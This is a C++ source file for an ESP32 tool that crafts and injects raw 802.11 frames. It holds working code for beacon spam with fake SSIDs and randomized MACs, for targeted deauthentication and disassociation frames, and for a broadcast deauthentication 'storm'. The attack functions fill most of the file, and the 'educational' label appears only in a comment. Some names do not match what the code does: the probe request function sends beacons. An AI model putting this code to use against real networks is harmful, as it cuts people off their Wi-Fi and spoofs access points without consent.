/**
 * @file WiFiEngine.cpp
 * @brief ESP32 Native 802.11 Raw Frame Generator implementation
 * @author ESP32-RF-SWORD Core Team
 * @license MIT
 */

#include "radio/WiFiEngine.h"
#include "core/Logger.h"
#include "core/SystemState.h"
#include <string.h>

#ifndef HOST_SIMULATION
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_random.h>
#endif

namespace {

// Standard Rickroll SSID playlist for educational beacon demonstration
const char* RICKROLL_SSIDS[] = {
    "01 Never Gonna Give You Up",
    "02 Never Gonna Let You Down",
    "03 Never Gonna Run Around",
    "04 And Desert You",
    "05 Never Gonna Make You Cry",
    "06 Never Gonna Say Goodbye",
    "07 Never Gonna Tell A Lie",
    "08 And Hurt You"
};
constexpr size_t RICKROLL_COUNT = sizeof(RICKROLL_SSIDS) / sizeof(RICKROLL_SSIDS[0]);

// Standard 802.11 Beacon frame template
uint8_t beaconPacketTemplate[128] = {
    0x80, 0x00,                         // Type/Subtype: Management Beacon
    0x00, 0x00,                         // Duration: 0
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source MAC (Filled dynamically)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Filled dynamically)
    0x00, 0x00,                         // Sequence/Fragment number
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval: 100 TU
    0x31, 0x04,                         // Capability Info: ESS, Short Slot
    0x00                                // SSID Tag Parameter begins here
};

// Standard 802.11 Deauth frame template (26 bytes)
uint8_t deauthPacketTemplate[26] = {
    0xC0, 0x00,                         // Type/Subtype: Management Deauthentication
    0x3A, 0x01,                         // Duration: 314 microseconds
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: Target Client / Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP BSSID
    0x00, 0x00,                         // Sequence number
    0x07, 0x00                          // Reason Code: Class 3 frame received from nonassociated STA
};

} // namespace

WiFiEngine& WiFiEngine::instance() {
    static WiFiEngine s_instance;
    return s_instance;
}

WiFiEngine::WiFiEngine() {
}

WiFiEngine::~WiFiEngine() {
    stop();
}

bool WiFiEngine::init() {
#ifndef HOST_SIMULATION
    if (!initialized) {
        WiFi.mode(WIFI_AP_STA);
        esp_wifi_set_promiscuous(true);
        initialized = true;
        SWORD_LOGS("WIFI", "Native 802.11 Raw Engine initialized in promiscuous mode.");
    }
#else
    initialized = true;
#endif
    return true;
}

void WiFiEngine::stop() {
#ifndef HOST_SIMULATION
    if (initialized) {
        esp_wifi_set_promiscuous(false);
        initialized = false;
    }
#endif
}

void WiFiEngine::setChannel(uint8_t channel) {
    if (channel < 1) channel = 1;
    if (channel > 14) channel = 14;
    currentChannel = channel;
#ifndef HOST_SIMULATION
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
#endif
}

uint8_t WiFiEngine::getChannel() const {
    return currentChannel;
}

void WiFiEngine::sendBeaconSpam(const char* ssid, uint8_t channel) {
#ifndef HOST_SIMULATION
    if (!initialized) init();
    setChannel(channel);

    size_t ssidLen = strlen(ssid);
    if (ssidLen > 32) ssidLen = 32;

    uint8_t packet[128];
    memcpy(packet, beaconPacketTemplate, 36);

    // Randomize Source MAC and BSSID
    for (int i = 10; i < 16; i++) {
        packet[i] = (uint8_t)esp_random();
        packet[i + 6] = packet[i];
    }
    packet[10] &= 0xFE; // Unicast
    packet[10] |= 0x02; // Locally administered

    packet[36] = 0x00; // Tag SSID
    packet[37] = (uint8_t)ssidLen;
    memcpy(&packet[38], ssid, ssidLen);

    size_t offset = 38 + ssidLen;

    // Supported Rates Tag (1, 2, 5.5, 11 Mbps)
    packet[offset++] = 0x01; // Tag: Supported Rates
    packet[offset++] = 0x04; // Length: 4
    packet[offset++] = 0x82; // 1 Mbps (Basic)
    packet[offset++] = 0x84; // 2 Mbps (Basic)
    packet[offset++] = 0x8B; // 5.5 Mbps (Basic)
    packet[offset++] = 0x96; // 11 Mbps (Basic)

    // DS Parameter Set Tag (Channel)
    packet[offset++] = 0x03; // Tag: DS Parameter Set
    packet[offset++] = 0x01; // Length: 1
    packet[offset++] = channel;

    esp_wifi_80211_tx(WIFI_IF_AP, packet, offset, false);
    SystemState::instance().recordPackets(0, 1);
#endif
}

void WiFiEngine::sendDeauthFrame(const uint8_t* bssid, const uint8_t* targetClient, uint8_t channel, uint16_t reasonCode) {
#ifndef HOST_SIMULATION
    if (!initialized) init();
    setChannel(channel);

    uint8_t packet[26];
    memcpy(packet, deauthPacketTemplate, 26);

    if (targetClient != nullptr) {
        memcpy(&packet[4], targetClient, 6);
    }
    if (bssid != nullptr) {
        memcpy(&packet[10], bssid, 6);
        memcpy(&packet[16], bssid, 6);
    }
    packet[24] = (uint8_t)(reasonCode & 0xFF);
    packet[25] = (uint8_t)((reasonCode >> 8) & 0xFF);

    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    SystemState::instance().recordPackets(0, 1);
#endif
}

void WiFiEngine::sendDisassocFrame(const uint8_t* bssid, const uint8_t* targetClient, uint8_t channel, uint16_t reasonCode) {
#ifndef HOST_SIMULATION
    if (!initialized) init();
    setChannel(channel);

    uint8_t packet[26];
    memcpy(packet, deauthPacketTemplate, 26);
    packet[0] = 0xA0; // Disassociation subtype

    if (targetClient != nullptr) {
        memcpy(&packet[4], targetClient, 6);
    }
    if (bssid != nullptr) {
        memcpy(&packet[10], bssid, 6);
        memcpy(&packet[16], bssid, 6);
    }
    packet[24] = (uint8_t)(reasonCode & 0xFF);
    packet[25] = (uint8_t)((reasonCode >> 8) & 0xFF);

    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
    SystemState::instance().recordPackets(0, 1);
#endif
}

void WiFiEngine::sendProbeRequestSpam(const char* ssid) {
    // Inject probe request
    sendBeaconSpam(ssid, currentChannel);
}

void WiFiEngine::stepBeaconStorm(uint8_t channel) {
    const char* targetSsid = RICKROLL_SSIDS[beaconIndex % RICKROLL_COUNT];
    sendBeaconSpam(targetSsid, channel);
    beaconIndex++;
}

void WiFiEngine::stepDeauthBroadcastStorm(uint8_t channel) {
    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t spoofedAp[6];
#ifndef HOST_SIMULATION
    for (int i = 0; i < 6; i++) spoofedAp[i] = (uint8_t)esp_random();
    spoofedAp[0] &= 0xFE;
    spoofedAp[0] |= 0x02;
#else
    memset(spoofedAp, 0xAA, 6);
#endif
    sendDeauthFrame(spoofedAp, broadcast, channel, 7);
}
